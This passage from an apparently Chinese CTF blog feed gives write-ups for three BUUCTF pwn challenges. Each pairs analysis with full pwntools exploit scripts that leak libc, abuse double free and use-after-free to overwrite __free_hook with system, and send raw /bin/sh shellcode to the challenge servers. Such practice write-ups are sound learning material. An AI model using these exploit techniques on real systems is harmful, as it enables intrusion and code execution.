src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/27.png" class=""><h4 id="0x01-IDA分析-4"><a href="#0x01-IDA分析-4" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/28.jpg" class=""><p>在初始化的时候有两个地方可以泄露libc，一开始就瞄了一下没太在意，后面发现libc泄露不了没法写，看到wp才知道，写堆题还是要看看其他的输入点，每个输入点都有可能是一个漏洞点！</p><p>puts函数的输出是直到碰到”\x00”才会结束，s是一个大小为16的数组，它只让我们输入前八，所以我们把前八给写满如果后面没有”\x00”就会把后八的字符给带出来，后面碰巧是libc里面的地址</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/29.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/35.jpg" class=""><p>虽然%3$p会报错，但是%p不会报错调试一下，全是栈上的地址，随便找一个就行</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/33.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/34.jpg" class=""><p>下面就是正常的堆，show和edit函数废了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/30.png" class=""><p>漏洞点就是在del里面，有个uaf</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/31.png" class=""><h4 id="0x02解题思路-1"><a href="#0x02解题思路-1" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>通过前面的溢出，泄露出libc</li><li>double free控制堆块修改fd指针指向free_hook</li><li>修改free_hook为system</li></ol><h4 id="0x03-完整EXP-4"><a href="#0x03-完整EXP-4" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_en_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;ciscn_2019_en_3&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25784&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the size of story: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;please inpute the story: &#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input your choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Please input the index:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ID.\n&#x27;</span>,<span class="string">&#x27;zyen1111&#x27;</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]-<span class="number">231</span></span><br><span class="line">io.success(<span class="string">&quot;[*]libc_base =&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io.success(<span class="string">&quot;[*]system_addr =&gt; &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">io.success(<span class="string">&quot;[*]free_hook =&gt; &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结-1"><a href="#0x04总结-1" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-puts小实验"><a href="#1-puts小实验" class="headerlink" title="1.puts小实验"></a>1.puts小实验</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">16</span>];</span><br><span class="line">read(<span class="number">0</span>,s,<span class="number">16</span>);</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是read了8个字符，这次我们read了16个字符，但是我们的输入只输入了8个1，同样的，我们看到了它有泄露下面的地址，puts函数还是挺危险的！</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/37.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/36.jpg" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/38.png" class=""><p>最后啰嗦一下，此double free已经不适应用于libc-2.27了，libc-2.26不知道，double free的补丁已经打到libc-2.27上了，搞得我本地调试不了…（懒的换libc</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/32.jpg" class=""><p><a href="https://blog.csdn.net/easy_level1/article/details/115724038">libc补丁</a></p><p>加了个key，记得可以改这个key绕过这个检查的，但是这题没有edit函数….</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/39.jpg" class=""><h3 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h3><h4 id="0x00-基本信息-5"><a href="#0x00-基本信息-5" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/51.png" class=""><h4 id="0x01-IDA分析-5"><a href="#0x01-IDA分析-5" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/40.png" class=""><p>程序的流程很简单就是输入shllcode，然后执行，但是sub_400786里面还有名堂</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/41.png" class=""><p>它会对比一段字符串，如果匹配就能执行我们的shellcode，”\x00”就能绕过，问题不大</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/42.png" class=""><p>但当我把shellcode打进去的时候，很惊奇的发现居然没getshell，动调发现它居然把shellcode的push 42给占了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/43.png" class=""><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/44.png" class=""><p>可能某个地方覆盖了吧也不太清楚，在shellcode前面加上几个”\x6a”就可以了</p><h4 id="0x02-完整EXP"><a href="#0x02-完整EXP" class="headerlink" title="0x02 完整EXP"></a>0x02 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.27.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;starctf_2019_babyshell&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26094&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># check = &#x27;\x5A\x5A\x4A\x20\x6C\x6F\x76\x65\x73\x20\x73\x68\x65\x6C\x6C\x5F\x63\x6F\x64\x65\x2C\x61\x6E\x64\x20\x68\x65\x72\x65\x20\x69\x73\x20\x61\x20\x67\x69\x66\x74\x3A\x05\x20\x65\x6E\x6A\x6F\x79\x20\x69\x74\x21\x0A\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;\x6a\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;give me shellcode, plz:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;\x00\x6a&#x27;</span>+shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io.recv(10)</span></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p>哇！哭了，学到了，直接编写shellcode调用sys_read</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./starctf_2019_babyshell&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x4008CB&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">shellcode = asm(<span class="string">&#x27;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;syscall&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27; plz:\n&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xC</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend"><a href="#bjdctf-2020-YDSneedGrirlfriend" class="headerlink" title="bjdctf_2020_YDSneedGrirlfriend"></a>bjdctf_2020_YDSneedGrirlfriend</h3><h4 id="0x00-基本信息-6"><a href="#0x00-基本信息-6" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/45.png" class=""><h4 id="0x01-IDA分析-6"><a href="#0x01-IDA分析-6" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/46.png" class=""><p>上面还有一个限制堆块数量的判断，不重要，可以看到这里申请了一个0x10的堆块写入了print_girlfriend_name的函数地址，但是这个print_girfriend_name…就是一个后门</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/47.png" class=""><p>现在还没感觉像后门，但是看到print函数的时候，仔细看看(*girlfriendlst[v1])(girlfrendlist[v1])，如果我们劫持了包含print_girlfriend_name的0x10堆块，修改成其他的函数地址，比如system@got，那么就会变成system(girlfrendlist[v1] + 8)</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/48.png" class=""><p>再看看del函数，思路就很清晰了</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/49.jpg" class=""><p>有个后门函数…</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/50.png" class=""><h4 id="0x02-解题思路-3"><a href="#0x02-解题思路-3" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><ol><li>double free一个堆块</li><li>申请一个0x20的堆块，double free的0x10的堆块就写入了print_girlfriend_name</li><li>申请的时候改成后门函数</li></ol><h4 id="0x03-完整EXP-5"><a href="#0x03-完整EXP-5" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"><span class="comment"># add(0x20,&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>看了大佬的wp，其实不用改，只要print_girlfriend_name上面写着是后门函数就行，不知道为啥system(“/bin/sh”)一直不行，一进入就down了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;29413&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name size is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Her name is :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x400B9C</span>))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021HWS硬件安全在线夏令营总结</title>
      <link href="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
      <url>/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/</url>
      
